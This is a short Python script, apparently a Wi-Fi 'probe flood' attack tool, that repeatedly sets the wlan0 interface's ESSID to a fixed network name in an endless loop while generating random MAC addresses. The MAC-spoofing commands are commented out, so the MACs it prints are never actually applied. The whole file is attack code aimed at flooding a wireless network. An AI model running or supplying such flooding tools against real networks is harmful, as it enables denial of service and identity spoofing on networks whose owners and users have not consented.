import random
import os

class ProbeFlood():
 def generatemac(self):
  m = [0x00, 0x16, 0x3e, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
  s = ':'.join(map(lambda x: "%02x" % x, m))
  return s

 def flood(self):
  ssid = '"Muniz"'
  try:
   while True:
    mac = self.generatemac()
    #os.system('ifconfig wlan0 down')
    #os.system('ifconfig wlan0 hw ether ' + mac)
    #os.system('ifconfig wlan0 up')
    cmd = 'iwconfig wlan0 essid ' + ssid
    print('ssid: ' + ssid + ' mac: ' + mac)
    os.system(cmd)
  except:
   raise

if __name__ == "__main__":
 atack = ProbeFlood()
 atack.flood()